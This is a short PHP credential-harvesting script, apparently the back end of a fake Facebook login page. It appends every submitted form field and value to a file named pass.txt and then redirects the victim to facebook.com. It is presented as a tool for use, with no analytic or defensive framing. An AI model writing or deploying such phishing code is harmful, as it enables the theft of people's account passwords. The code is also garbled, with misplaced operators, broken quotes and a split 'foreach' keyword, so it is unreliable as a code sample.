<?php
header ('location: www.facebook.com');
$handle - fopen(pass.txt", "a");
for each($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "-');
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n")
fclose($handle);
exit;
?>